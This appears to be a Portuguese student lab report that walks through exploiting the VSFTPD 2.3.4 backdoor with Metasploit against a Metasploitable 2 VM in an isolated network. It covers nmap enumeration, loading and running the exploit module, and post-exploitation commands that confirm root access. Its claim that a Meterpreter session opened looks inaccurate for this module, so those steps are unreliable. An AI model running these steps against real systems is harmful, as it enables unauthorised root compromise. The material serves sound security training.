# Laborat-rio-3---Explora-o-do-VSFTPD-2.3.4-com-Metasploit

## Objetivo

Explorar a vulnerabilidade do serviço **VSFTPD 2.3.4** utilizando o Metasploit Framework para obter acesso remoto à máquina **Metasploitable 2**.

---

## Ambiente

### Máquina atacante
- Kali Linux

### Máquina alvo
- Metasploitable 2

### Rede
- Rede Interna (VirtualBox)

---

## Ferramentas utilizadas

- Nmap
- Metasploit Framework
- Meterpreter
- Linux

---

## Reconhecimento

Primeiramente foi verificada a comunicação entre as máquinas utilizando o comando `ping`, garantindo que ambas estavam na mesma rede.

Em seguida foi realizada a enumeração da máquina alvo.

```bash
nmap -sV 10.10.10.20
```

### Explicação

- `nmap` → Scanner de rede.
- `-sV` → Descobre a versão dos serviços.

Resultado obtido:

- Porta **21/TCP** aberta.
- Serviço **FTP**.
- Versão **VSFTPD 2.3.4**.

📷 **Print:** *(Inserir imagem do Nmap)*

---

## Pesquisa do Exploit

Foi iniciado o Metasploit.

```bash
msfconsole
```

Em seguida foi pesquisado um exploit para o serviço identificado.

```bash
search vsftpd
```

Resultado:

```text
exploit/unix/ftp/vsftpd_234_backdoor
```

### Explicação

- `search` → Pesquisa módulos existentes dentro do Metasploit.
- Neste caso foi encontrado um exploit específico para o VSFTPD 2.3.4.

📷 **Print:** *(Inserir imagem da pesquisa)*

---

## Carregando o módulo

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### Explicação

O comando `use` carrega o módulo escolhido na memória do Metasploit para que ele possa ser configurado e executado.

---

## Configuração do alvo

```bash
set RHOSTS 10.10.10.20
```

### Explicação

- `set` → Define um parâmetro.
- `RHOSTS` → Endereço IP da máquina alvo.

Para verificar as configurações:

```bash
show options
```

Para verificar parâmetros obrigatórios:

```bash
show missing
```

---

## Execução do exploit

```bash
run
```

Resultado:

- Backdoor criada com sucesso.
- Sessão Meterpreter aberta.

📷 **Print:** *(Inserir imagem da sessão Meterpreter)*

---

## Pós-exploração

Identificação do sistema:

```bash
sysinfo
```

Verificação do usuário:

```bash
getuid
```

Resultado:

```text
root
```

Diretório atual:

```bash
pwd
```

Abrindo um shell Linux:

```bash
shell
```

Confirmação do usuário:

```bash
whoami
```

Resultado:

```text
root
```

📷 **Print:** *(Inserir imagem do shell e do whoami)*

---

# Dificuldades encontradas

- Erros de digitação no caminho do módulo.
- Diferenças entre versões antigas e atuais do Metasploit.
- Interpretação das opções do exploit e do payload.
- Configuração incorreta do parâmetro `RHOSTS`.
- Necessidade de compreender o funcionamento dos módulos antes da execução.

---

# Aprendizados

- Como realizar enumeração utilizando o Nmap.
- Como pesquisar módulos no Metasploit.
- Diferença entre `search` e `use`.
- Como configurar um exploit.
- Funcionamento do Meterpreter.
- Importância da enumeração antes da exploração.
- Verificação de privilégios após obter acesso.

---

# Conclusão

O laboratório foi concluído com sucesso.

Foi possível identificar um serviço vulnerável, selecionar o exploit adequado, configurar o módulo, explorar a vulnerabilidade e obter acesso remoto com privilégios de **root** na máquina Metasploitable 2.

Este laboratório reforçou conceitos fundamentais de reconhecimento, enumeração, exploração e pós-exploração em um ambiente controlado.

---
